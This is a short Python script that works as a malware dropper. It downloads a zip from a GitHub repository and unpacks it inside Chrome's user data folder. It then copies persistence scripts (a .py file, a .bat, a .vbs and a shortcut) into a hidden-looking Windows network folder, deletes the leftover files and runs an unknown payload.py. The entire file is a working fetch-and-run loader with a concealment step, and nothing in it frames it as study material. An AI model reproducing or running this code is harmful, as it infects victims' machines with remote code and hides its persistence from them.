import os
import subprocess
import getpass
from zipfile import ZipFile
import shutil
import requests

user = getpass.getuser()

def main():

    r = requests.get("https://github.com/spxctrzz/adawdgsdfagdf/raw/refs/heads/main/runtime.zip")
    with open(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime.zip", "wb") as f:
        f.write(r.content)
    with ZipFile(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime.zip", "r") as f:
        f.extractall(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime")
    shutil.copy(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\persist.py", fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\Connections\persist.py")
    shutil.copy(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\runner.bat", fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\Connections\runner.bat")
    shutil.copy(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\run.vbs", fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\Connections\run.vbs")
    shutil.copy(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\runcut.lnk", fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\Connections\runcut.lnk")
    os.remove(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\persist.py")
    os.remove(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\runner.bat")
    os.remove(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\run.vbs")
    os.remove(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime.zip")
    subprocess.run(["python", fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\payload.py"], cwd=fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime")


main()